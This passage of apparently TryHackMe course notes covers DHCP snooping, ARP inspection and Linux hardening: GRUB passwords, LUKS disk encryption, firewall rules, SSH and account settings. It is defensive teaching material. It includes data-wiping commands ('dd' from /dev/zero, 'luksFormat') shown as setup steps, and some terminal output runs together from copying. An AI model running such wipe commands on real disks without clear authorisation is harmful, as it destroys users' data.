- A DHCP packet that includes a relay agent address that is not `0.0.0.0`

Although recognized by the **IEEE** in several 
research papers, there is no standardization of DHCP snooping. That 
said, it generally does not change between vendors, unlike other 
protocols.

# Dynamic ARP Inspection

[Cisco](https://www.cisco.com/c/en/us/td/docs/switches/lan/catalyst4500/12-2/25ew/configuration/guide/conf/dynarp.html) defines **ARP inspection** as "a security feature that validates **A**ddress **R**esolution **P**rotocol (**ARP**) packets in a network."

ARP inspection will **validate** and **rate-limit**
 ARP packets as necessary; if an ARP packet's MAC and IP address do not 
match, the protocol will intercept, log, and discard the packet.

ARP inspection uses the DHCP binding database filled from DHCP snooping as its list of binding IP addresses.

Let's
 recap; the DHCP binding database provides the expected MAC and IP 
address pair of untrusted hosts; ARP inspection will compare the source 
IP address and MAC address to the binding pair; if they are mismatched, 
it will drop the packet.

Below is a diagram showing a valid ARP request that matches both the binding database and request information.

```c
Address Resolution Protocol (request)
    Hardware type: Ethernet (1)
    Protocol type: IPv4 (0x0800)
    Hardware size: 6
    Protocol size: 4
    Opcode: request (1)
    Sender MAC address: 02:c8:85:b5:5a:aa (02:c8:85:b5:5a:aa)
    Sender IP address: 10.10.0.1
    Target MAC address: 00:00:00_00:00:00 (00:00:00:00:00:00)
    Target IP address: 10.10.239.154
```

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/1fd8c97d90c07caf7af827ac051a271d.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/1fd8c97d90c07caf7af827ac051a271d.png)

```c
Router# show ip dhcp snoop bind
MacAddress         IpAddress       Lease(sec) Type          VLAN Interface
------------------ --------------- ---------- ------------- ---- --------------------
02:c8:85:b5:5a:aa  10.10.0.1       23453      dhcp-snooping 10   GigabitEthernet1/1
01:02:03:04:05:06  2.2.2.2         69445      dhcp-snooping 20   GigabitEthernet2/1
```

Below is a diagram showing an invalid ARP request that does not match the binding database and requests information.

```c
Address Resolution Protocol (request)
    Hardware type: Ethernet (1)
    Protocol type: IPv4 (0x0800)
    Hardware size: 6
    Protocol size: 4
    Opcode: request (1)
    Sender MAC address: 02:c8:85:b5:5a:aa (02:c8:85:b5:5a:aa)
    Sender IP address: 10.10.0.1
    Target MAC address: 00:00:00_00:00:00 (00:00:00:00:00:00)
    Target IP address: 10.10.239.154
```

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/a9fd447d0ca399191f87067e1d16abfe.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/a9fd447d0ca399191f87067e1d16abfe.png)

```c
Router# show ip dhcp snoop bind
MacAddress         IpAddress       Lease(sec) Type          VLAN Interface
------------------ --------------- ---------- ------------- ---- --------------------
00:01:02:03:04:05  1.1.1.1         23453      dhcp-snooping 10   GigabitEthernet1/1
01:02:03:04:05:06  2.2.2.2         69445      dhcp-snooping 20   GigabitEthernet2/1
```

## **LINUX SSTEM HARDENING**

**Introduction**

Linux systems provide a 
reliable and robust alternative to closed-source systems, such as MS 
Windows Server and UNIX. Moreover, choosing Linux can help cut down 
licensing costs dramatically. If you are not convinced, compare the cost
 of hosting a web server using Debian 11 with the cost of hosting a web 
server using MS Windows Server 2022. When we compare the combined costs 
of licensing and the minimum required hardware for each of these modern 
releases, we will have a strong case for Linux. Of course, we cannot 
claim that Linux is always the best choice; however, Linux is the best 
choice for many scenarios. Before using this option, we must focus on 
securing our Linux systems, also known as Linux

*hardening*

.

**Physical Security**

One of the security principles is Defence-in-Depth. Hence, we should 
always think in terms of layers of security. One of the first layers is 
physical security.

It would be best if you prevented potential adversaries from being 
able to gain physical access to your computer systems. If an intruder 
can gain physical access to your office, it would be easy to remove the 
disk drive and take it away. That’s a simple attack that requires 
minimal technical skills.

Let’s say you have taken the necessary measures to prevent intruders 
from taking the disk drive or the whole computer system. Moreover, you 
have ensured that your system passwords are complex and impossible to 
guess. If an intruder can access the system physically, it is a 
non-sophisticated task to use GRUB, a popular Linux bootloader, to reset
 the root password account. Hence we have the adage “boot access = root 
access”.

It is evident that we need to ensure physical security for our 
computer systems; however, in the unlikely event that physical security 
is breached, we need to provide additional layers of protection. Many 
BIOS and UEFI firmware allows you to add a boot password. This password 
will prevent unauthorised users from booting the system. However, this 
can only be used for personal systems; it won’t make sense to use it on 
servers as this will require someone to be physically present to supply 
the boot password.

We can consider adding a GRUB password depending on the Linux system 
we want to protect. Many tools help achieve that. One tool is `grub2-mkpasswd-pbkdf2`,
 which prompts you to input your password twice and generates a hash for
 you. The resulting hash should be added to the appropriate 
configuration file depending on the Linux distribution (examples: [Fedora](https://docs.fedoraproject.org/en-US/fedora-coreos/grub-password/) and [Ubuntu](https://help.ubuntu.com/community/Grub2/Passwords)).
 This configuration would prevent unauthorised users from resetting your
 root password. It will require the user to supply a password to access 
advanced boot configurations via GRUB, including logging in with root 
access.

AttackBox Terminal

```
root@AttackBox# grub2-mkpasswd-pbkdf2Enter password:
Reenter password:
PBKDF2 hash of your password is grub.pbkdf2.sha512.10000.534B77859C13DCF094E90B926E26C586F5DC9D00687853487C4BB1500D57EC29E2D6D07A586262E093DCBDFF4B3552742A25700BAB6B76A8206B3BFCB273EEB4.4BA1447590EA8451CD224AA1C5F8623FE85D23F6D34E2026E3F08C5AA79282DB65B330BAB4944E9374EC51BF11EFF418EDA5D66FF4D7AAA86F662F793B92DA61
```

It is important to note that adding a password for GRUB is not 
available for systems deployed using cloud service providers (such as 
our Linux VM); a GRUB password does not make sense as you don’t have 
access to the physical terminal.

Ensuring proper physical security is a must considering how easy it 
is for an attacker with physical access to wreak havoc. Adding a 
password to GRUB is a reasonable measure to block users with physical 
access to a system’s keyboard from gaining access. However, we need a 
plan in case an attacker finds a way to steal the disk drives.

**Filesystem Partitioning and Encryption**

Encryption makes data 
unreadable without the decryption key. In the scenario where an 
adversary has complete physical access to your laptop, for instance, by 
stealing it, we want to ensure that it won’t be of any use to them. A 
disk drive full of encrypted data should be as good as a damaged one.

There are various software systems and tools that provide encryption 
to Linux systems. Since many modern Linux distributions ship with LUKS 
(Linux Unified Key Setup), let’s cover it in more detail.

When a partition is encrypted with LUKS, the disk layout would look as shown in the figure below.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/ee1310ecb1558e550a9bff3a53ece0ff.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/ee1310ecb1558e550a9bff3a53ece0ff.png)

We have the following fields:

- **LUKS phdr**: It stands for *LUKS Partition Header*. LUKS phdr stores information about the UUID (Universally Unique
Identifier), the used cipher, the cipher mode, the key length, and the
checksum of the master key.
- **KM**: KM stands for *Key Material*, where we
have KM1, KM2, …, KM8. Each key material section is associated with a
key slot, which can be indicated as active in the LUKS phdr. When the
key slot is active, the associated key material section contains a copy
of the master key encrypted with a user's password. In other words, we
might have the master key encrypted with the first user's password and
saved in KM1, encrypted with the second user's password and saved in
KM2, and so on.
- **Bulk Data**: This refers to the data encrypted by the master key. The master key is saved and encrypted by the user's
password in a key material section.

LUKS reuses existing block encryption implementations. The pseudocode to encrypt data uses the following syntax:

`enc_data = encrypt(cipher_name, cipher_mode, key, original, original_length)`

As we can see, LUKS works with different ciphers and cipher modes. *Original* refers to the plaintext data of length, *original_length*.
 The user-supplied password is used to derive the encryption key; the 
key is derived using password-based key derive function 2 (PBKDF2).

`key = PBKDF2(password, salt, iteration_count, derived_key_length)`

Using a *salt* with a hash function repeating an *iteration count* ensures that the resulting key is secure enough for encryption. For more information, you might want to refer to the [Introduction to Cryptography](https://tryhackme.com/room/cryptographyintro) room.

Similarly, to decrypt data and restore the original plaintext, LUKS uses the following syntax:

`original = decrypt(cipher_name, cipher_mode, key, enc_data, original_length)`

Most distributions let you encrypt a drive using a graphical 
interface. However, if you would like to set up LUKS from the command 
line, the steps are along these lines:

- Install `cryptsetup-luks`. (You can issue `apt install cryptsetup`, `yum install cryptsetup-luks` or `dnf install cryptsetup-luks` for Ubuntu/Debian, RHEL/Cent OS, and Fedora, respectively.)
- Confirm the partition name using `fdisk -l`, `lsblk` or `blkid`. (Create a partition using `fdisk` if necessary.)
- Set up the partition for LUKS encryption: `cryptsetup -y -v luksFormat /dev/sdb1`. (Replace `/dev/sdb1` with the partition name you want to encrypt.)
- Create a mapping to access the partition: `cryptsetup luksOpen /dev/sdb1 EDCdrive`.
- Confirm mapping details: `ls -l /dev/mapper/EDCdrive` and `cryptsetup -v status EDCdrive`.
- Overwrite existing data with zero: `dd if=/dev/zero of=/dev/mapper/EDCdrive`.
- Format the partition: `mkfs.ext4 /dev/mapper/EDCdrive -L "Strategos USB"`.
- Mount it and start using it like a usual partition: `mount /dev/mapper/EDCdrive /media/secure-USB`.

In the terminal below, we show a real example of encrypting a USB flash memory that initially has one partition at `/dev/sdb1` in NTFS format.

AttackBox Terminal

```
root@AttackBox# user@TryHackMe$ sudo lsblkNAME        MAJ:MIN RM   SIZE RO TYPE MOUNTPOINTS
sdb           8:16   1  14.3G  0 disk
└─sdb1        8:17   1  14.3G  0 part /run/media/strategos/Strategos
[...]

user@TryHackMe$ sudo blkid[...]
/dev/sdb1: LABEL="Strategos" BLOCK_SIZE="512" UUID="59402B4A4E12CD06" TYPE="ntfs"

user@TryHackMe$ sudo cryptsetup -y -v luksFormat /dev/sdb1WARNING: Device /dev/sdb1 already contains a 'ntfs' superblock signature.

WARNING!
========
This will overwrite data on /dev/sdb1 irrevocably.

Are you sure? (Type 'yes' in capital letters): YES
Enter passphrase for /dev/sdb1:
Verify passphrase:
Existing 'ntfs' superblock signature on device /dev/sdb1 will be wiped.
Existing 'dos' partition signature on device /dev/sdb1 will be wiped.
Key slot 0 created.
Command successful.

user@TryHackMe$ sudo cryptsetup luksOpen /dev/sdb1 EDCdriveuser@TryHackMe$ sudo mkfs.ext4 /dev/mapper/EDCdrive -L "Strategos USB"mke2fs 1.46.5 (30-Dec-2021)
[...]
Allocating group tables: done
Writing inode tables: done
Creating journal (16384 blocks): done
Writing superblocks and filesystem accounting information: done

user@TryHackMe$ sudo mount /dev/mapper/EDCdrive /media/secure-USB
```

If you want to check the LUKS setting, you can issue the command `cryptsetup luksDump /dev/sdb1`. In the terminal output below, we can see the UUID of the encrypted disk. We can also see that the cipher used is `aes-xts-plain64`. As for the key, PBKDF2 used SHA256 with the provided salt for 194180 iterations.

AttackBox Terminal

```
root@AttackBox# sudo cryptsetup luksDump /dev/sdb1LUKS header information
Version:        2
Epoch:          3
Metadata area:  16384 [bytes]
Keyslots area:  16744448 [bytes]
UUID:           41199bad-d753-4dce-9284-0a81d27acc95
Label:          (no label)
Subsystem:      (no subsystem)
Flags:          (no flags)

Data segments:
  0: crypt
    offset: 16777216 [bytes]
    length: (whole device)
    cipher: aes-xts-plain64
    sector: 512 [bytes]

Keyslots:
  0: luks2
    Key:        512 bits
    Priority:   normal
    Cipher:     aes-xts-plain64
    Cipher key: 512 bits
    PBKDF:      argon2id
    Time cost:  4
    Memory:     965922
    Threads:    4
    Salt:       bd 45 40 96 27 93 cd fa 50 60 f4 28 d4 d8 b2 bd
                58 69 72 72 35 2f 26 9c a8 14 ef 91 04 b2 dc cd
    AF stripes: 4000
    AF hash:    sha256
    Area offset:32768 [bytes]
    Area length:258048 [bytes]
    Digest ID:  0
Tokens:
Digests:
  0: pbkdf2
    Hash:       sha256
    Iterations: 194180
    Salt:       6e e1 70 a4 3f d6 71 44 c8 e6 84 4d 99 51 7d c9
                49 66 bf 37 61 b8 c3 d2 4e aa f7 25 27 e2 b3 8a
    Digest:     c1 87 99 a1 d1 7a 05 8a ca cd 13 74 f0 33 ef 3a
                98 c9 d7 a8 70 93 e2 ac 07 0f 2a 5c 89 f1 18 1d
```

**Firewall**

Let’s briefly revisit the client/server model before we start. Any 
networked device can be a client, a server, or both simultaneously. The 
server offers a service, and the client connects to the server to use 
it. Examples of servers include web servers (HTTP and HTTPS), mail 
servers (SMTP(S), POP3(S), and IMAP(S)), name servers (DNS), and SSH 
servers. A server listens on a known TCP or UDP port number awaiting 
incoming client connection requests. The client initiates the connection
 request to the listening server, and the server responds to it.

A firewall decides which packets can enter a system and which packets
 can leave a system. For more information about firewalls, we recommend 
you check the [Firewalls](https://tryhackme.com/room/redteamfirewalls)
 room. Without a firewall, a client can communicate with any server 
without restrictions; moreover, a client can function as a server and 
listen for incoming connections from other clients. In other words, if 
an attacker manages to exploit a vulnerability on a system without a 
firewall in place, the attacker could use the exploit to listen on a 
chosen port number on the victim’s machine and connect to it without any
 restrictions.

Setting up a firewall offers many security benefits. First and 
foremost, firewall rules provide fine control over which packets can 
leave your system and which packets can enter your system. Consequently,
 firewall rules help mitigate various security risks by controlling 
network traffic between devices. More importantly, firewall rules can be
 devised to ensure that no client can act as a server. In other words, 
an attacker cannot start a reachable listening port on a target machine;
 the exploit can start a listening port, but the firewall will prevent 
all incoming connection attempts.

A host-based firewall is a piece of software installed on a system we
 want to protect. Unlike a network-based firewall, the host-based 
firewall restricts network packets to and from a single host. The 
firewall has two main functions:

- What can enter? Allow or deny packets from entering a system.
- What can leave? Allow or deny packets from leaving a system.

Imposing rules on the packets entering and leaving a system will 
significantly improve our security posture. Let’s investigate how we can
 achieve this on a Linux system.

## Linux Firewalls

The first Linux firewall was a packet filtering firewall, i.e., a 
stateless firewall. A stateless firewall can inspect certain fields in 
the IP and TCP/UDP headers to decide upon a packet but does not maintain
 information about ongoing TCP connections. As a result, a packet can 
manipulate a few TCP flags to appear as if it is part of an ongoing 
connection and evade certain restrictions. Current Linux firewalls are 
stateful firewalls; they keep track of ongoing connections and restrict 
packets based on specific fields in the IP and TCP/UDP headers and based
 on whether the packet is part of an ongoing connection.

The IP header fields that find their way into the firewall rules are:

1. Source IP address
2. Destination IP address

The TCP/UDP header fields that are of primary concern for firewall rules are:

1. Source TCP/UDP port
2. Destination TCP/UDP port

It is worth noting that it is impossible to allow and deny packets 
based on the process but instead on the port number. If you want the web
 browser to access the web, you must allow the respective ports, such as
 ports 80 and 443. This limitation differs from MS Windows’ built-in 
firewall, which can restrict and allow traffic per application.

On a Linux system, a solution such as [SELinux](https://github.com/SELinuxProject) or [AppArmor](https://www.apparmor.net/) can be used for more granular control over processes and their network access. For example, we can allow only the `/usr/bin/apache2`
 binary to use ports 80 and 443 while preventing any other binary from 
doing so on the underlying system. Both tools enforce access control 
policies based on the specific process or binary, providing a more 
comprehensive way to secure a Linux system.

Let’s look take a closer look at the different available Linux firewalls.

## Netfilter

At the very core, we have netfilter. The netfilter project provides 
packet-filtering software for the Linux kernel 2.4.x and later versions.
 The netfilter hooks require a front-end such as `iptables` or `nftables` to manage.

In the following examples, we use different front-ends to netfilter 
in order to allow incoming SSH connections to the SSH server on our 
Linux system. As shown in the figure below, we want our SSH server to be
 accessible to anyone on the Internet with an SSH client.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/812543382c7fd172dfa1190c2e0363d8.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/812543382c7fd172dfa1190c2e0363d8.png)

## iptables

As a front-end, iptables provides the user-space command line tools 
to configure the packet filtering rule set using the netfilter hooks. 
For filtering the traffic, iptables has the following default chains:

- **Input**: This chain applies to the packets incoming to the firewall.
- **Output**: This chain applies to the packets outgoing from the firewall.
- **Forward** This chain applies to the packets routed through the system.

Let’s say that we want to be able to access the SSH server on our 
system remotely. For the SSH server to be able to communicate with the 
world, we need two things:

1. Accept incoming packets to TCP port 22.
2. Accept outgoing packets from TCP port 22.

Let’s translate the above two requirements into `iptables` commands:

`iptables -A INPUT -p tcp --dport 22 -j ACCEPT`

- `A INPUT` appends to the INPUT chain, i.e., packets destined for the system.
- `p tcp --dport 22` applies to TCP protocol with destination port 22.
- `j ACCEPT` specifies (jump to) target rule ACCEPT.

`iptables -A OUTPUT -p tcp --sport 22 -j ACCEPT`

- `A OUTPUT` append to the OUTPUT chain, i.e., packets leaving the system.
- `p tcp --sport 22` applies to TCP protocol with source port 22.

Let’s say you only want to allow traffic to the local SSH server and 
block everything else. In this case, you need to add two more rules to 
set the default behaviour of your firewall:

- `iptables -A INPUT -j DROP` to block all incoming traffic not allowed in previous rules.
- `iptables -A OUTPUT -j DROP` to block all outgoing traffic not allowed in previous rules.

In brief, the rules below need to be applied in the following order:

AttackBox Terminal

```
root@AttackBox# iptables -A INPUT -p tcp --dport 22 -j ACCEPTiptables -A OUTPUT -p tcp --sport 22 -j ACCEPT
iptables -A INPUT -j DROP
iptables -A OUTPUT -j DROP
```

In practice, you should flush (delete) previous rules before applying new ones. This action can be achieved using `iptables -F`.

## nftables

nftables is supported in Kernel 3.13 and later, adding various 
improvements over iptables, particularly in scalability and performance.

We will create a simple nftables configuration that allows traffic to our local SSH server.

Unlike iptables, nftables start with no tables or chains. We need to 
add the necessary tables and chains before adding rules. To begin, we 
will create a table, `fwfilter`.

`nft add table fwfilter`

- `add` is used to add a table. Other commands include `delete` to delete a table, `list` to list the chains and rules in a table, and `flush` to clear all chains and rules from a table.
- `table TABLE_NAME` is used to specify the name of the table we want to create or work on.

In our newly created table, `fwfilter`, we will add an *input* chain and an *output* chain for incoming and outgoing packets, respectively.

- `nft add chain fwfilter fwinput { type filter hook input priority 0 \; }`
- `nft add chain fwfilter fwoutput { type filter hook output priority 0 \; }`

The above two commands add two chains to the table `fwfilter`:

- `fwinput` is the input chain. It is of type `filter` and applies to the input hook.
- `fwoutput` is the output chain. It is of type `filter` and applies to the output hook.

With the two chains created within our table, we can add the 
necessary rule to allow SSH traffic. The following two rules are added 
to the table `fwfilter` to the chains `fwinput` and `fwoutput`, respectively:

- `nft add fwfilter fwinput tcp dport 22 accept` accepts TCP traffic to the local system’s destination port 22.
- `nft add fwfilter fwoutput tcp sport 22 accept` accepts TCP traffic from the local system’s source port 22.

We can check the shape of the `fwfilter` table using the command `nft list table fwfilter`:

AttackBox Terminal

```
root@AttackBox# sudo nft list table fwfiltertable ip fwfilter {
    chain fwinput {
        type filter hook input priority filter;
        tcp dport 22 accept
    }

    chain fwoutput {
        type filter hook output priority filter;
        tcp sport 22 accept
    }
}
```

We hope the above example gave you a general overview of how nftables work.

## UFW

After this overview of iptables and nftables, you might have started 
to develop the impression that configuring firewalls on Linux is a 
cumbersome, error-prone process. We already mentioned that iptables is 
like a front-end to netfilter; however, we can simplify things by 
providing a front-end to the front-end!

Example front-ends to iptables are shown in the figure below and can be divided into:

- Command-line Interface (CLI) front-ends, such as firewalld and ufw
- Graphical User Interface (GUI) front-ends, such as fwbuilder

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/f50217a465f06499ce979228323d2945.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/f50217a465f06499ce979228323d2945.png)

UFW stands for uncomplicated firewall. Let’s see how it stands for its promise of being *uncomplicated*. We will allow SSH traffic. This firewall rule can be achieved through one of the following commands:

`ufw allow 22/tcp`

It configures the firewall to `allow` traffic to TCP port 22. We can confirm our settings with the command `ufw status`.

AttackBox Terminal

```
root@AttackBox# sudo ufw statusStatus: active

To                         Action      From
--                         ------      ----
22/tcp                     ALLOW       Anywhere
22/tcp (v6)                ALLOW       Anywhere (v6)
```

## Firewall Policy

Before configuring a firewall, you need to decide upon the firewall 
policy. You might be the decision maker regarding the firewall policy or
 an enforcer of an existing security policy that covers firewall 
configuration. It all depends on the system you are protecting.

We will not go into security policies as this is outside the scope of
 this room. We will mention that the two main approaches are:

- Block everything and allow certain exceptions.
- Allow everything and block certain exceptions.

Each of the above two approaches has its advantages and 
disadvantages. Blocking everything with a limited set of exceptions 
would provide tighter and better security; however, it might cause 
inconvenience to the users depending on the situation.

Let’s consider the following example. You are responsible for 
configuring the (host) firewall installed on the university computers. 
In this example, the academic institution has decided to block all 
outgoing and incoming traffic except for DNS, HTTP, and HTTPS traffic. 
In firewall terms, that’s allowing UDP port 53 and TCP ports 80 and 443.
 This policy should allow browsing the Internet over HTTP and HTTPS; 
however, if one of the websites uses a non-standard HTTP or HTTPS port, 
it will be blocked. Dealing with these exceptions will create a 
challenge; keeping the firewall rules organised and properly documented 
is tricky as the number of exceptions grows over time.

**Remote Access**

Providing remote access
 to a system is a very convenient way to access your system and files 
when you are not physically present at the target system’s keyboard. 
However, this also means that you are voluntarily providing a service 
that attackers will target. Common attacks include:

1. Password sniffing
2. Password guessing and brute-forcing
3. Exploiting the listening service

## Protecting Against Password Sniffing

Remote access can be achieved through many different protocols and 
services. Although all modern systems use encrypted protocols, such as 
the SSH protocol, for remote access, older systems might still use 
cleartext protocols, such as the Telnet protocol.

In the following figure, although the user has selected a strong 
password, it is being sent in cleartext, which is readable to anyone 
with a packet-capturing tool across the network path.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/24edecfab51b2f08dbb1e6b55866e012.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/24edecfab51b2f08dbb1e6b55866e012.png)

It is crucial to ensure that you select a protocol that encrypts 
traffic. The SSH protocol has been around for more than two decades. It 
has stood the test of time. It has many uses ranging from secure remote 
access to secure file transfers.

## Protecting Against Password Guessing

When you set up your Linux system with SSH for remote administration,
 you also make your Linux box available for all interested parties. Many
 malicious hackers search the Internet for listening SSH servers and 
start to guess the login credentials; usually, they try `root` with the most common passwords.

The figure below shows that the system uses the SSH protocol to 
ensure encrypted communications; however, authentication relies on login
 credentials. Many users are tempted to use weak passwords or reuse the 
same password with other services. Although `qwerty1234` is not in an English dictionary, it is commonly found among the top 10 or 20 most common passwords, making it easy to guess.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/e3122ae7889c869e262600353de756c3.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/e3122ae7889c869e262600353de756c3.png)

Because your SSH server will be configured to listen for incoming 
connections 24 hours a day, 365 days a year, evil users have all the 
time in the world to attempt one password after another. There are a few
 guidelines that you can use:

1. Disable remote login as `root`; force login as non-root users.
2. Disable password authentication; force public key authentication instead.

The reasoning behind the above guidelines is that you don’t want the adversary to be able to attack the `root`
 account directly. Moreover, even if it is a non-root account, you don’t
 want the attacker to gain access if there is a weakness in the 
password.

The configuration of the OpenSSH server can be controlled via the `sshd_config` file, usually located at `/etc/ssh/sshd_config`. You can disable the root login by adding the following line:

`PermitRootLogin no`

Although a password such as `9bNfX2gmDZ4o` is difficult to guess, most users find memorising it inconvenient. Imagine if the account belongs to the *sudoers* (`sudo` group), and the user needs to type this password every time they need to issue a command with `sudo`. You may have to discipline to do that, but you cannot expect this to work for everyone.

Many users are tempted to select a user-friendly password or share 
the same password across multiple accounts. Either approach would make 
the password easier for the attacker to guess.

It would be best to rely on public key authentication with SSH to 
help improve the security of the remote login system and make it as 
fail-proof as possible.

If you haven’t created an SSH key pair, you must issue the command `ssh-keygen -t rsa`. It will generate a private key saved in `id_rsa` and a public key saved in `id_rsa.pub`.

For the SSH server to authenticate you using your public key instead 
of your passwords, your public key needs to be copied to the target SSH 
server. An easy way to do it would be by issuing the command `ssh-copy-id username@server` where `username` is your username, and `server` is the hostname or IP address of the SSH server.

It is best to ensure you have access to the physical terminal before 
you disable password authentication to avoid locking yourself out. You 
might need to ensure having the following two lines in your `sshd_config` file.

- `PubkeyAuthentication yes` to enable public key authentication
- `PasswordAuthentication no` to disable password authentication

**Securing User Accounts**

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/11272fc8185d2af591adc771bd63952b.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/11272fc8185d2af591adc771bd63952b.png)

The `root` account carries with it tremendous power and 
hence risk. You are at risk of rendering your system unbootable with a 
simple mistake. Using a non-root account for everyday work is 
recommended to avoid sabotaging your system. However, `root` privileges are still needed for system maintenance, installing/removing software packages, and updating/configuring the system.

## Use sudo

To avoid logging in as `root`, the better approach would be to have an account -created for administrative purposes- added to the *sudoers*, i.e. group who can use the `sudo` command. `sudo` stands for Super User Do and it should precede any command that requires `root` privileges.

Depending on the Linux distribution, we can add a user to the sudoers
 group in the following ways. Some distributions, such as Debian and 
Ubuntu, call the sudoers group `sudo`. In this case, you would need to issue the following command:

`usermod -aG sudo username`

- `usermod` modifies a user account.
- `aG` appends to group.
- `sudo` is the name of the group of users who can use `sudo` on Debian-based distributions.
- `username` is the name of the user account you want to modify.

Other distributions, such as RedHat and Fedora, refer to the sudoers group as `wheel`. Consequently, you would need to issue the following command:

`usermod -aG wheel username`

The only difference is the name of the sudoers group.

## Disable root

Once you have created an account for administrative purposes and added it to the `sudo`/`wheel` group, you might consider disabling the `root` account. A straightforward way is to modify the `/etc/passwd` and change the `root` shell to `/sbin/nologin`. In other words, edit `/etc/passwd` and change the line `root:x:0:0:root:/root:/bin/bash` to `root:x:0:0:root:/root:/sbin/nologin`.

## Enforce a Strong Password Policy

The `libpwquality` library provides many options for password constraints. The configuration file can be found at:

- `/etc/security/pwquality.conf` on RedHat and Fedora
- `/etc/pam.d/common-password` on Debian and Ubuntu. You can install it using `apt-get install libpam-pwquality`

Here are a few example options:

- `difok` allows you to specify the number of characters in the new password that were not present in the old password.
- `minlen` sets the minimum allowed length for new passwords.
- `minclass` specifies the minimum number of required classes of characters; a class can be uppercase, lowercase, and digits, among others.
- `badwords` provides a space-separated list of words that must not be contained in the chosen password.
- `retry=N` prompts the user `N` times before returning an error.

Below is an example of `/etc/security/pwquality.conf`.

AttackBox Terminal

```
root@AttackBox# sudo cat /etc/security/pwquality.confdifok=5
minlen=10
minclass=3
retry=2
```

You can check all the available options on the man page, `man pwquality.conf`.

## Disable Unused Accounts

As part of system maintenance, it is vital to disable user accounts 
that no longer need access to the system in question. For instance, 
these users might have moved to another department or quit the company.

You can disable a user account in the same way we would disable the root account. An easy way would be to edit the `/etc/passwd` file and set the shell of the user account we want to disable to `/sbin/nologin`.

Let’s say that we want to disable the account of the user Michael with username `michael`.

- Enabled account: `michael:x:1000:1000:Michael:/home/michael:/usr/bin/fish`
- Disabled account: `michael:x:1000:1000:Michael:/home/michael:/sbin/nologin`

We should do the same for local services. In other words, we should set the shell to `sbin/nologin` for all the local service accounts such as `www-data`, `mongo`, and `nginx`,
 to name a few. The reason is that these services need accounts to run 
on the system but would never need to log in and access a shell. Any of 
these services could perhaps have an RCE (Remote Code Execution) 
vulnerability, and by setting the shell to `nologin`, we can at least prevent interactive logins for the account of the affected service.

**Software and Services**

Every piece of software
 you install on your system also increases the number of potential 
vulnerabilities. In other words, installing additional software packages
 and new services increases the vulnerabilities an attacker can exploit 
to gain access to your system and, eventually, to other systems on your 
network. You can follow some guidelines to help you reduce the attack 
surface.

## Disable Unnecessary Services

One of the easiest ways to improve your security posture is by 
removing or disabling unneeded services and packages. In simple terms, 
we need to minimise the number of installed system packages as every 
package carries some risk, and we cannot know when a related 
vulnerability will be discovered. The best policy is to avoid installing
 unneeded packages.

For example, if you don’t need a web server, you should ensure you 
don’t install one. If you needed to run a web server at one point but no
 longer need it now, you should remove it or at least disable it. 
Otherwise, you will be exposing yourself to unnecessary risk.

## Block Unneeded Network Ports

After you remove any packages that are not required and disable 
preinstalled services that might not be removed, it is critical to set 
your firewall rules accordingly. If you don’t have a web server, there 
is no reason to allow packets to TCP ports 80 and 443. The reasoning 
behind this is that if the attacker manages to start a disabled service,
 the firewall will block its traffic, and the attacker won’t be able to 
access its TCP port(s).

## Avoid Legacy Protocols

At one point in the past, Telnet was the primary protocol to remote 
access a system; the TFTP protocol was commonly used to transfer files. 
Such protocols should no longer be allowed as secure alternatives have 
been released.

Instead of Telnet, the SSH protocol is now widely available. For 
example, the Secure File Transfer Protocol (SFTP) protocol provides a 
great alternative to the TFTP protocol. The critical point is that a 
secure alternative is selected and used.

## Remove Identification Strings

Whenever you connect to a remote server, it usually replies with its 
version number. This information would reveal various information to the
 attacker, such as the name of the server/program, the version number, 
and the host operating system.

**Update and Upgrade Policies**

It is vital that you keep your system updated with the latest security patches and bug fixes.

You can update a Debian-based distribution, such as Ubuntu, with the following two commands:

1. `apt update` to download package information from the configured sources
2. `apt upgrade` to install available upgrades for all packages from the configured sources

You can update a RedHat or Fedora system using the following:

- `dnf update` on newer releases (Red Hat Enterprise Linux 8 and later)
- `yum update` on older releases (Red Hat Enterprise Linux 7 and earlier)

Since we are talking about production systems, we need to select 
distributions that will continue to receive updates smoothly for many 
years.

## Ubuntu LTS Releases

For example, Ubuntu releases a Long Term Support (LTS) version every 
two years. LTS releases have an even version number (indicating the 
year) with 04 (for April), such as 18.04, 20.04, and 22.04. An LTS 
version will grant you five years of security updates for the base OS 
without a subscription and another five years if you pay for Extended 
Security Maintenance (ESM). For more information, you might want to 
check [The Ubuntu lifecycle and release cadence](https://ubuntu.com/about/release-cycle).

Using an Ubuntu LTS release, you can download updates without a 
subscription for the first five years. Consider the following Linux 
system with Ubuntu 14.04. It was released in 2014, and its free support 
ended in April 2019. In other words, free update service was available 
till 2019. In the terminal below, we see that there are 133 additional 
updates that we can download and install if we have an Ubuntu Pro 
(Infra-Only) subscription (previously known as Ubuntu Advantage (UA) for
 Infrastructure).

AttackBox Terminal

```
root@AttackBox# user@tryhackme$ uname -aLinux ubuntu-14-vm 4.4.0-148-generic #174~14.04.1-Ubuntu SMP Thu May 9 08:18:11 UTC 2019 i686 athlon i686 GNU/Linuxuser@tryhackme$ sudo apt upgradeReading package lists... Done
Building dependency tree
Reading state information... Done
